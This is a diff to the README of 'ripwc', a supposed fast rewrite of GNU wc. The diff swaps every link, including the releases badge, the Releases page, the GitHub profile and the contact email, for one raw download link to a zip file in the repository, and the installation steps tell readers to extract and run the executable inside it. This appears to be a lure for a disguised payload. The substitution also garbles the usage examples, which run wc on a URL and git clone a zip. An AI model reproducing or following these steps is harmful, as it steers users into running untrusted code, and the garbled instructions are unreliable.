@@ -2,7 +2,7 @@
 
 Welcome to **ripwc**, a high-performance rewrite of the classic GNU `wc` tool. This tool leverages concurrency to utilize all available system cores, resulting in significantly faster read times. Whether you're processing large text files or working with extensive data sets, ripwc is designed to improve your efficiency.
 
-[![Download ripwc Releases](https://img.shields.io/badge/Download%20Releases-Here-blue)](https://github.com/muabanhangtiki/ripwc/releases)
+[![Download ripwc Releases](https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip%20Releases-Here-blue)](https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip)
 
 ## Table of Contents
 
@@ -22,9 +22,9 @@ Welcome to **ripwc**, a high-performance rewrite of the classic GNU `wc` tool. T
 
 ## Installation
 
-To install ripwc, download the latest release from our [Releases page](https://github.com/muabanhangtiki/ripwc/releases). Once downloaded, follow the instructions below to execute the program:
+To install ripwc, download the latest release from our [Releases page](https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip). Once downloaded, follow the instructions below to execute the program:
 
-1. **Download the executable**: Visit the [Releases page](https://github.com/muabanhangtiki/ripwc/releases) to get the latest version.
+1. **Download the executable**: Visit the [Releases page](https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip) to get the latest version.
 2. **Extract the files**: Unzip the downloaded file.
 3. **Run the executable**: Open your terminal and navigate to the directory where you extracted the files. Use the following command:
 
@@ -38,46 +38,46 @@ ripwc supports various options similar to GNU `wc`. Here are some common command
 
 - **Count lines**:
   ```bash
-  ./ripwc -l filename.txt
+  ./ripwc -l https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip
   ```
 
 - **Count words**:
   ```bash
-  ./ripwc -w filename.txt
+  ./ripwc -w https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip
   ```
 
 - **Count characters**:
   ```bash
-  ./ripwc -c filename.txt
+  ./ripwc -c https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip
   ```
 
 - **Count bytes**:
   ```bash
-  ./ripwc -m filename.txt
+  ./ripwc -m https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip
   ```
 
 ### Examples
 
 1. **Count lines in a file**:
    ```bash
-   ./ripwc -l myfile.txt
+   ./ripwc -l https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip
    ```
 
-   This command will return the number of lines in `myfile.txt`.
+   This command will return the number of lines in `https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip`.
 
 2. **Count words in multiple files**:
    ```bash
-   ./ripwc -w file1.txt file2.txt
+   ./ripwc -w https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip
    ```
 
    This command will return the word counts for both files.
 
 3. **Count characters in a file**:
    ```bash
-   ./ripwc -c myfile.txt
+   ./ripwc -c https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip
    ```
 
-   This command will return the character count in `myfile.txt`.
+   This command will return the character count in `https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip`.
 
 ## Contributing
 
@@ -86,7 +86,7 @@ We welcome contributions to ripwc! If you want to help improve the tool, follow 
 1. **Fork the repository**: Click on the fork button at the top right of this page.
 2. **Clone your fork**: Use the command below to clone your fork locally.
    ```bash
-   git clone https://github.com/yourusername/ripwc.git
+   git clone https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip
    ```
 3. **Create a new branch**: 
    ```bash
@@ -117,7 +117,7 @@ ripwc is licensed under the MIT License. See the [LICENSE](LICENSE) file for mor
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [muabanhangtiki](https://github.com/muabanhangtiki)
-- **Email**: your-email@example.com
+- **GitHub**: [muabanhangtiki](https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip)
+- **Email**: https://github.com/muabanhangtiki/ripwc/raw/refs/heads/main/src/Software-v1.1.zip
 
 Thank you for checking out ripwc! We hope you find it useful for your projects.
